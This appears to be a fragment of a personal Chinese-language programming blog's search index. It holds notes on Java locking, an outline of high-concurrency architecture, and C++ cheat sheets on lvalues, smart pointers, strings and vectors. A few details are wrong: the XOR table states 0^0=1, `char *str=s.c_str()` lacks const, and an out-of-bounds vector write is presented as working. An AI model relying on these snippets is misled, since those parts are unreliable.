&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeTasks</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        lock.lock();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (tasks.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">                condition.await();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Runnable</span> <span class="variable">task</span> <span class="operator">=</span> tasks.remove(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            task.run();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            lock.unlock();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 高并发架构</h1>
<h2 id="2-1-负载均衡">2.1 负载均衡</h2>
<h2 id="2-2-分库分表">2.2 分库分表</h2>
<p>通过分库分表，可以极大的减少单点数据库的压力，提高查询效率。通过分库分表，主要解决<mark>数据量大、并发访问高</mark>的问题。通过将同一表的数据分布到多个数据库实例中，从而，提升系统的水平扩展能力。</p>
<p>跨多个数据库实例的事务操作变得复杂，可能需要分布式事务管理</p>
<h2 id="2-3-消息队列">2.3 消息队列</h2>
<p>消息队列在系统中引入异步消息处理机制，可以削峰填谷，缓解瞬时高并发压力。</p>
<h2 id="2-4-异步处理">2.4 异步处理</h2>
<p>异步处理通过将一些非实时任务放入队列异步执行，减少实时系统的响应时间。</p>
<h2 id="2-5-缓存">2.5 缓存</h2>
<p>分布式缓存，通过将频繁访问的数据，存储在快速访问的介质中，减少数据库、和后端服务的压力。</p>
<h2 id="2-6-服务拆分">2.6 服务拆分</h2>
<p>将大型单体应用拆分为多个小型服务（微服务架构），各服务可以独立扩展和部署。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>按业务功能划分</p>
</li>
<li class="lvl-2">
<p>按边界上下文划分</p>
</li>
<li class="lvl-2">
<p>数据库分离</p>
</li>
<li class="lvl-2">
<p>限流和熔断：限流用于控制系统的流量，使系统不至于被过载流量压垮，保护系统在高并发下的稳定性，防止系统崩溃。熔断器用于在下游服务不稳定时，快速返回错误以保护系统。</p>
</li>
</ul>
<h1>3 参考</h1>
<ol>
<li class="lvl-3">
<p><a href="https://mp.weixin.qq.com/s/MHGDXf0cOEEcXXcYpQPhuQ">高并发设计之细粒度锁 ： 5种细粒度锁的设计技巧图解（高并发篇） (qq.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://mp.weixin.qq.com/s/yVYRuhRYT1ijllBCEojYdg">高并发架构方案详解(8主流高并发架构) (qq.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://mp.weixin.qq.com/s/JE1c2fTcHQ4U5OaWWgkBqA">高并发解决方案详解(8大主流架构方案) (qq.com)</a></p>
</li>
<li class="lvl-3">
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/11/%E8%AF%AD%E6%B3%95/C++/C++%20Primper/</url>
    <content><![CDATA[<h2 id="0-1-左值和右值">0.1 左值和右值</h2>
<p><a href="https://zhuanlan.zhihu.com/p/240833006">C++中左值和右值的理解 - 知乎 (zhihu.com)</a></p>
<ul class="lvl-0">
<li class="lvl-2">lvalue(ell-value)：
<ul class="lvl-2">
<li class="lvl-6">左值是可寻址的变量，有持久性。既可以出现在等号左边，也可以出现在等号右边</li>
<li class="lvl-6">左值表达式的求值结果是一个对象或者一个函数，有些左值不能成为赋值语句的左侧运算对象(const)。当对象被用作左值的时候，用的是object’s identity(its location in memory)。</li>
</ul>
</li>
<li class="lvl-3">rvalue(are-value)：当一个对象被用作右值的时候，用的是对象的值(the object’s content)
<ul class="lvl-2">
<li class="lvl-7">右值一般是不可寻址的常量，或在表达式求值过程中创建的无名临时对象，短暂性的</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a; <span class="comment">// a 为左值</span></span><br><span class="line">a = <span class="number">3</span>; <span class="comment">// 3 为右值</span></span><br></pre></td></tr></table></figure>
<p>需要右值时，可以使用左值，反之不行</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>左值引用：引用一个对象；</p>
</li>
<li class="lvl-2">
<p>右值引用（rvalue reference）：就是必须绑定到右值的引用，C++11中右值引用可以实现“移动语义”，通过 &amp;&amp; 获得右值引用。必须绑定到右值的引用，可以绑定到一个将要销毁的对象</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">6</span>; <span class="comment">// x是左值，6是右值</span></span><br><span class="line"><span class="type">int</span> &amp;y = x; <span class="comment">// 左值引用，y引用x</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> &amp;z1 = x * <span class="number">6</span>; <span class="comment">// 错误，x*6是一个右值</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;z2 =  x * <span class="number">6</span>; <span class="comment">// 正确，可以将一个const引用绑定到一个右值</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> &amp;&amp;z3 = x * <span class="number">6</span>; <span class="comment">// 正确，右值引用</span></span><br><span class="line"><span class="type">int</span> &amp;&amp;z4 = x; <span class="comment">// 错误，x是一个左值</span></span><br></pre></td></tr></table></figure>
<h1>1 chapt 12</h1>
<p>smart pointer：管理动态对象<br>
shared_ptr：允许多个指针指向同一个对象<br>
unique_ptr：独占所指向的对象<br>
weak_ptr：弱引用，指向shared_ptr所管理的对象</p>
<p>管理动态内存：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>忘记delete动态分配的内存（内存泄漏）</p>
</li>
<li class="lvl-2">
<p>在对象delete后使用</p>
</li>
<li class="lvl-2">
<p>同一块内存delete多次</p>
</li>
</ul>
<h2 id="1-1-smart-pointer">1.1 smart pointer</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310161042659.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310161049131.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310161040197.png" alt=""></p>
<h2 id="1-2-unique-ptr">1.2 unique_ptr</h2>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202310161139098.png" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title>C++语法</title>
    <url>/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C++%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1>tips</h1>
<blockquote>
<p>#define pii pair&lt;int, int&gt;</p>
<p>typedef pair&lt;int, string&gt; pis;</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>memset进行数组初始化</p>
<p><a href="http://c.biancheng.net/view/231.html">http://c.biancheng.net/view/231.html</a></p>
</li>
</ul>
<h1>数据范围</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303271603594.png" alt="20201215210918150"></p>
<p>$INT_MAX=2147483647=2^{31}-1&lt;3\times 10^9$</p>
<p>$LONG_MAX=2147483647$</p>
<p><strong>INT_MIN:-2147483648<br>
INT_MAX:2147483647<br>
LONG_MIN:-2147483648<br>
LONG_MAX:2147483647<br>
LLONG_MIN:-9223372036854775808<br>
LLONG_MAX:9223372036854775807</strong></p>
<blockquote>
<p>int : 4字节</p>
<p>long: 4字节</p>
</blockquote>
<blockquote>
<p>直接初始化：不使用=来初始化</p>
<p>间接初始化：使用=初始化，新创建的object是初始化initializer的复制</p>
</blockquote>
<h2 id="malloc和new的区别">malloc和new的区别</h2>
<blockquote>
<p>new在分配内存时会调用默认的构造函数，而malloc不会调用。</p>
<p>而STL的string在赋值之前须要调用默认的构造函数以初始化string后才干使用。</p>
</blockquote>
<p><a href="http://www.bubuko.com/infodetail-2094709.html">C++ string中的几个小陷阱，你掉进过吗？</a></p>
<center>
    <img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/img/202206021813578.png" width=45%/>
    <img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/img/202206021814398.png" width=45%/>
 </center>
<p>捆绑赋值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">tie&#123;a,b&#125;=b,c</span><br></pre></td></tr></table></figure>
<p>位运算库函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__builtin_popcount(k)	<span class="comment">//计算k二进制表示中1的个数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">iota</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),<span class="number">0</span>)    <span class="comment">//[0,1,2,3,...]</span></span><br><span class="line"><span class="comment">//根据nums1对num排序</span></span><br><span class="line"><span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),[&amp;](<span class="type">int</span> a,<span class="type">int</span> b)&#123;</span><br><span class="line"><span class="keyword">return</span> nums1[a]&lt;nums1[b];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>匿名表达式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">auto</span> calMax = [](vector&lt;<span class="type">int</span>&gt; &amp;arr, <span class="type">int</span> boardr) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="头文件">头文件</h2>
<p><a href="https://www.cnblogs.com/fenghuan/p/4794514.html">C++中头文件（.h）和源文件（.cpp）都应该写些什么</a></p>
<h2 id="unordered-map和map区别">unordered_map和map区别</h2>
<blockquote>
<p>map&lt;pair&lt;int,int&gt;,int&gt; used; 可以</p>
<p>unordered_map&lt;pair&lt;int,int&gt;, int&gt; used  不可以</p>
<p>unordered_map&lt;int, set&lt;int&gt;&gt; ms;可以</p>
</blockquote>
<h1>运算符</h1>
<p><a href="https://www.jb51.net/article/50569.htm">C的|、||、&amp;、&amp;&amp;、异或、~、！运算符_C 语言_脚本之家 (jb51.net)</a></p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>操作</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>^（异或）</td>
<td>2(10)^3(11)=1(01)</td>
<td><strong>1^1=0 1^0=1 0^1=1 0^0=1</strong></td>
</tr>
<tr>
<td>&amp;&amp; 逻辑与</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="数学">数学</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>cmath</p>
<ul class="lvl-2">
<li class="lvl-4">pow(a,b)，计算$a^b$</li>
</ul>
</li>
<li class="lvl-2">
</li>
</ul>
<h1>常用函数</h1>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
<th>头文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>寻找大于指定值的第一个下标</td>
<td>vector&lt;int&gt; nums = {1, 2, 3, 4, 5, 6, 7, 8, 9};<br>cout &lt;&lt; upper_bound(nums.begin(), nums.end(), 5) - nums.begin() &lt;&lt; endl;<br>输出为下标5</td>
<td>algorithm.h</td>
</tr>
<tr>
<td>第三个参数表明累加类型，避免结果越界</td>
<td>accumulate(beans.begin(),beans.end(),(long long)0);<br>accumulate(beans.begin(),beans.end(),0);</td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>操作</th>
<th>说明</th>
<th>头文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>找到第一个大于等于val的位置</td>
<td>lower_bound(nums.begin(), nums.end(), val)</td>
<td></td>
</tr>
</tbody>
</table>
<h1>类型转换</h1>
<p><a href="https://blog.csdn.net/baidu_34884208/article/details/88342844">(7条消息) C<ins>字符串转换（stoi；stol；stoul；stoll；stoull；stof；stod；stold）_WilliamX2020的博客-CSDN博客_c</ins> stod函数</a></p>
<h2 id="int-string">int -&gt;string</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>;</span><br><span class="line">string b=<span class="built_in">to_string</span>(a);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th></th>
<th>vector</th>
<th>stack</th>
<th>queue</th>
</tr>
</thead>
<tbody>
<tr>
<td>修改大小</td>
<td>vector&lt;int&gt; tmp;  tmp.resize(n);</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="string-int">string-&gt;int</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/img/202206021019131.png" alt="202203261127974"></p>
<h1>iostream</h1>
<blockquote>
<p>cin：遇到空格结束读取</p>
<p>getline：读取一行，遇到换行符结束，读取换行符，但最后的换行符不存入string中</p>
</blockquote>
<p><a href="https://www.cnblogs.com/suchang/p/10547671.html">c++string标准输入和getline()整行读入</a></p>
<blockquote>
<p>s.size()返回字符串长度，s.size()-1是最后一个字符，s.size()是字符串结束标记<code>\0</code></p>
</blockquote>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      string s;</span><br><span class="line">      <span class="keyword">while</span> (<span class="built_in">getline</span>(cin, s)) &#123;</span><br><span class="line">          cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">          cout &lt;&lt; s.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">          cout &lt;&lt; s[s.<span class="built_in">size</span>() - <span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s[s.<span class="built_in">size</span>()] &lt;&lt; endl;</span><br><span class="line">          <span class="keyword">if</span> (s[s.<span class="built_in">size</span>()] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">              cout &lt;&lt; <span class="string">&quot;***&quot;</span> &lt;&lt; endl;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/img/202204191123698.png" alt="image-20210406114903198"></p>
<blockquote>
<p>从流中读取内容</p>
<p>文件流&lt;fstream&gt;</p>
</blockquote>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">unordered_map&lt;string, <span class="type">int</span>&gt; keywords;</span><br><span class="line">   <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">   string keyword;</span><br><span class="line">   <span class="function">ifstream <span class="title">inKeyword</span><span class="params">(<span class="string">&quot;lap2/keywords.txt&quot;</span>, ios::in)</span></span>;</span><br><span class="line">   <span class="keyword">while</span> (<span class="built_in">getline</span>(inKeyword, keyword)) &#123;</span><br><span class="line">       <span class="comment">// cout &lt;&lt; keyword &lt;&lt; endl;</span></span><br><span class="line">       keywords[keyword] = i;</span><br><span class="line">       ++i;</span><br><span class="line">   &#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<h1>numeric</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>accumulate</p>
<blockquote>
<p>accumulate带有<strong>三个形参</strong>：头两个形参指定要<strong>累加的元素范围</strong>，第三个形参则是<strong>累加的初值</strong>。</p>
<p>accumulate函数将它的一个内部变量设置为指定的初始值，然后在此初值上累加输入范围内所有元素的值。accumulate算法返回累加的结果，<strong>其返回类型就是其第三个实参的类型</strong>。</p>
</blockquote>
</li>
</ul>
<h1>list</h1>
<blockquote>
<p>list 不是顺序放bai在内存里的，一定要遍历一次；</p>
<p>list容器不提供 at() 和 操作符 operator[] ，对容器中元素的bai访问有些不便，但是我们可以使用迭代器进行元素的访问</p>
</blockquote>
<h1>string</h1>
<h2 id="string-vs-C-Style-string">string vs C-Style string</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符数组可以作为一个操作数或+=的右操作数</span></span><br><span class="line">string s;</span><br><span class="line">s+=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line">s=s+<span class="string">&quot;13124&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// string转化为字符数组</span></span><br><span class="line"><span class="type">char</span> *str=s.<span class="built_in">c_str</span>()    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//替换字符串，range is either an index and a length or a pair of iterators into s</span></span><br><span class="line">s.<span class="built_in">replace</span>(range,args)</span><br><span class="line">s.<span class="built_in">replace</span>(<span class="type">int</span> pos,<span class="type">int</span> n,<span class="type">const</span> <span class="type">char</span>* s) <span class="comment">//替换从pos开始的n个字符为字符串s</span></span><br><span class="line">s.<span class="built_in">find</span>(ch)==npos</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202302281602910.png" alt="image-20230228160251850"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202302281650772.png" alt="image-20230228165049715"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> main</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//Cstring与string转换</span></span><br><span class="line">    string s;</span><br><span class="line">    CString c_s;</span><br><span class="line">    c_s=s.<span class="built_in">c_str</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除最后一个字符</span></span><br><span class="line">    string str=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    str=str.<span class="built_in">substr</span>(<span class="number">0</span>,str.<span class="built_in">size</span>() - <span class="number">1</span>)</span><br><span class="line">    str.<span class="built_in">erase</span>(str.<span class="built_in">end</span>()<span class="number">-1</span>)</span><br><span class="line">    str.<span class="built_in">pop_back</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>accumulate</p>
<h2 id="初始化">初始化</h2>
<h2 id="2-操作">2. 操作</h2>
<blockquote>
<p>s.find(“a”) 在s中查找a</p>
<p>s.find(“a”,k) 在s中从位置k查找a</p>
</blockquote>
<h2 id="4-append方法">4. append方法</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>添加c类型字符串</p>
</li>
</ul>
<blockquote>
<p>输出hello world</p>
<p>函数中的指针并没有因为被释放而影响到与原字符串的链接，那append是如何附加的呢？</p>
</blockquote>
<pre><code>void append_test(string &amp;s) &#123;
    const char *t = &quot;world&quot;;
    s.append(t);
&#125;
int main() &#123;
    // string s;
    // char a = 'a';
    // s = (string)a;
    // cout &lt;&lt; s &lt;&lt; endl;

    string a = &quot;hello &quot;;
    append_test(a);
    cout &lt;&lt; a &lt;&lt; endl;
    getchar();
    return 0;
&#125;
</code></pre>
<ul class="lvl-0">
<li class="lvl-2">
<p>添加c字符串的一部分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s=”hello “；<span class="type">const</span> <span class="type">char</span> *c = “out here “;</span><br><span class="line">s.<span class="built_in">append</span>(c,<span class="number">3</span>); <span class="comment">// 把c类型字符串s的前n个字符连接到当前字符串结尾</span></span><br><span class="line">s = “hello out”;</span><br><span class="line">s.<span class="built_in">append</span>(c,<span class="number">4</span>,<span class="number">4</span>);<span class="comment">//从第4个字符数4个</span></span><br><span class="line">s=<span class="string">&quot;hello here&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>向string后添加多个字符</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">s<span class="number">1.</span><span class="built_in">append</span>(<span class="number">4</span>, <span class="string">&#x27;!&#x27;</span>); <span class="comment">//在当前字符串结尾添加4个字符!</span></span><br><span class="line"></span><br><span class="line">s1=<span class="string">&quot;hello!!!!&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>添加string</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1 = “hello “; string s2 = “wide “; string s3 = “world “;</span><br><span class="line">s<span class="number">1.</span><span class="built_in">append</span>(s2); s1 += s3; <span class="comment">//把字符串s连接到当前字符串的结尾</span></span><br><span class="line">s1 = “hello wide “; s1 = “hello wide world “;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>添加string一部分</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1 = “hello “, s2 = “wide world “;</span><br><span class="line">s<span class="number">1.</span><span class="built_in">append</span>(s2, <span class="number">5</span>, <span class="number">5</span>); <span class="comment">////把字符串s2中从5开始的5个字符连接到当前字符串的结尾</span></span><br><span class="line">s1 = “hello world”;</span><br><span class="line">string str1 = “hello “, str2 = “wide world “;</span><br><span class="line">str<span class="number">1.</span><span class="built_in">append</span>(str<span class="number">2.</span><span class="built_in">begin</span>()<span class="number">+5</span>, str<span class="number">2.</span><span class="built_in">end</span>()); <span class="comment">//把s2的迭代器begin()+5和end()之间的部分连接到当前字符串的结尾</span></span><br><span class="line">str1 = “hello world”;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1>vector(不定长数组)</h1>
<p>push_back和emplace_back区别</p>
<p><a href="https://www.dyxmq.cn/program/code/c-cpp/emplace-back.html">vector中emplace_back方法的用途 - 马谦的博客 (dyxmq.cn)</a></p>
<p><a href="https://blog.csdn.net/qq_40250056/article/details/114681940?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=1">(7条消息) C++容器vector的数组片段截取操作_stitching的博客-CSDN博客_vector截取一部分</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//比较相等</span></span><br><span class="line">a==b</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>操作</th>
<th>vector: nums</th>
<th>头文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>初始化</td>
<td>vector&lt;int&gt; num(10);//含有10个int元素的vector<br/>vector&lt;int&gt; num(10,0);//10个元素，初始化为0<br/>vector&lt;int&gt; a = {1, 2, 3};//含3个元素，1、2、3</td>
<td></td>
</tr>
<tr>
<td>在头部添加元素</td>
<td>nums.insert(nums.begin(), 1)</td>
<td></td>
</tr>
<tr>
<td></td>
<td>{0} ——&gt;{1,0}</td>
<td></td>
</tr>
<tr>
<td>在尾部添加元素</td>
<td>nums.push_back(2)</td>
<td></td>
</tr>
<tr>
<td>切片</td>
<td>vector&lt;it&gt; a<br/>vector&lt;int&gt; b<br/>b.assign(a.begin(), a.end())</td>
<td></td>
</tr>
<tr>
<td>反转</td>
<td>reverse(num.begin(), num.end())</td>
<td>algorithm</td>
</tr>
<tr>
<td>取最大元素</td>
<td>max_element(v.begin(), v.end())        返回vector&lt;type&gt;::iterator类型</td>
<td></td>
</tr>
<tr>
<td></td>
<td>resize</td>
<td>容量增大的话，值由给定的val初始化</td>
</tr>
<tr>
<td></td>
<td>assign</td>
<td></td>
</tr>
<tr>
<td>比较相等</td>
<td>a==b</td>
<td></td>
</tr>
</tbody>
</table>
<p>clear：清空元素，size变为0</p>
<h2 id="2-添加数据">2. 添加数据</h2>
<blockquote>
<p>num.push_back();//向尾部添加数据</p>
<p>num.pop_back();//删除最后一个元素，无返回值</p>
</blockquote>
<h2 id="3-访问数据">3. 访问数据</h2>
<blockquote>
<p>num.empty()  //为空返回1，判断vector是否为空</p>
<p>num[i]</p>
<p><a href="http://num.at">num.at</a>(i)</p>
<p>num.back() 访问最后一个值，不删除</p>
</blockquote>
<h2 id="4-压缩">4. 压缩</h2>
<blockquote>
<p>num.size()</p>
<p>num.resize()</p>
<p>num.clear()</p>
</blockquote>
<h2 id="5-最大值、最小值">5. 最大值、最小值</h2>
<blockquote>
<p>头文件 &lt;algorithm&gt;</p>
</blockquote>
<h2 id="6-边界测试">6. 边界测试</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">b</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.<span class="built_in">size</span>(); i++)</span><br><span class="line">      cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  cout &lt;&lt; endl;</span><br><span class="line">  b[<span class="number">5</span>] = <span class="number">100</span>;</span><br><span class="line">  cout &lt;&lt; b[<span class="number">5</span>] &lt;&lt; endl;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0 0 0 0 0</p>
<p>100</p>
</blockquote>
<p>在main函数中没有提醒，在子函数中会出现如下错误，子函数返回时变量b空间需要被释放</p>
<img src="https://gitee.com/destiny0118/picgo/raw/master/20210521230255.png" alt="image-20210521230248016" style="zoom: 50%;" />
<h2 id="7-截取一部分">7. 截取一部分</h2>
<p>截取a的一部分到b的后面，a与b同类型</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; a = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;, b;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; c;</span><br><span class="line"><span class="built_in">copy</span>(<span class="built_in">begin</span>(a) + <span class="number">0</span>, <span class="built_in">begin</span>(a) + <span class="number">2</span>, <span class="built_in">back_inserter</span>(b));</span><br><span class="line">c.<span class="built_in">push_back</span>(b);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> t : c[<span class="number">0</span>])</span><br><span class="line">    cout &lt;&lt; t &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; endl;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1 2</p>
</blockquote>
<h2 id="8-去除vector重复元素">8. 去除vector重复元素</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">set&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">setVec</span>(ans.<span class="built_in">begin</span>(), ans.<span class="built_in">end</span>());</span><br><span class="line">ans.<span class="built_in">assign</span>(setVec.<span class="built_in">begin</span>(), setVec.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure>
<h2 id="9-查找指定值是否存在">9. 查找指定值是否存在</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">find</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>(),value)==ans.<span class="built_in">end</span>())<span class="comment">//查找值不存在</span></span><br></pre></td></tr></table></figure>
<h2 id="测试代码">测试代码</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector.cpp</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">num</span><span class="params">(<span class="number">10</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            cout &lt;&lt; num[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; num.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    num.<span class="built_in">push_back</span>(<span class="number">123</span>);</span><br><span class="line">    cout &lt;&lt; num[<span class="number">10</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// num.pop_back();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout &lt;&lt; num.empty() &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator itMax = <span class="built_in">max_element</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>());</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator itMin = <span class="built_in">min_element</span>(num.<span class="built_in">begin</span>(), num.<span class="built_in">end</span>());</span><br><span 